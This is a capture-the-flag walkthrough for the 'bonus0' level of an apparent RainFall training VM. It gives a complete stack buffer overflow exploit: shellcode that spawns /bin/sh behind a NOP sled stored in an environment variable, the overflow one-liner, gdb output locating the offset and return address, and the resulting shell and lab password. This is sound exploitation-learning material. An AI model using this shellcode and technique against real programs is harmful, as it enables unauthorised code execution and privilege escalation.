# Walkthrough

## Solution
```
export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
```
```
(python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x7c\xf8\xff\xbf' + 'A' * 7"; cat -) | ./bonus0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA|���AAAAAAA��� AAAAAAAAA|���AAAAAAA���
pwd
/home/user/bonus0
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Explanation

### Execution

```
bonus0@RainFall:~$ ./bonus0 
 - 
hello
 - 
you
hello you
bonus0@RainFall:~$ ./bonus0
 - 
he llo
 - 
you
he llo you
```
-> wait for 2 inputs and concatenate them


### Disassembly

```
info var
data_start

info function
0x080484b4  p
0x0804851e  pp
0x080485a4  main
```

You can view the asm code [here](Ressources/assembly.asm)  

Buffer addresses:
buf = 0xbffff6f6
buf1 = 0xbffff6a8
buf2 = 0xbffff6bc


### Execution

```
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
-> the 2nd input cause a segfault - **Offset is 9**
The buffer is only 20 chars, so we only have 11 bytes available to inject a shellcode, which is not enough.

Let's save our shellcode in an env variable:  
*shellcode:* '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars
```  

The actual address of the shellcode must be known ahead of time, which can be difficult to know in a dynamically changing stack.
By creating a large array (or sled) of these NOP instructions and placing it before the shellcode, if the EIP returns to any address found in the NOP sled, the EIP will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP will slide down the sled to the shellcode, which will execute properly.  

**Shellcode env:  **
```
export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
```  

#### Find the Shellcode env variable address
```
$> gdb bonus0
(gdb) break main
Breakpoint 1 at 0x80485a7
(gdb) run
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/s *((char **)environ)
0xbffff86c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
```

the beginning of our NOP + shellcode is at address 0xbffff86c
-> we have to choose an address that contains a NOP (\x90), so that it will sled into the beginning of our shellcode and execute it

```
(gdb) x/12wx 0xbffff86c
0xbffff86c:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xbffff87c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff88c:	0x90909090	0x90909090	0x90909090	0x90909090
```

-> let's pick 0xbffff87c

> (python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x7c\xf8\xff\xbf' + 'A' * 7"; cat -) | ./bonus0

% 4095 + \n = 4096, to fill the buf3, \n because of the strchr(buf3, '\n')
% 'A' * 9 because the offset of the 2nd input that causes the segfault is 9
% address of the shellcode (4 bytes)
% 'A' * 7, so that we have 20 bytes for buf2 (9 + 4 + 7).


% source:
% https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x270-stackoverflow.html
% x/s *((char **)environ) to get address of env variables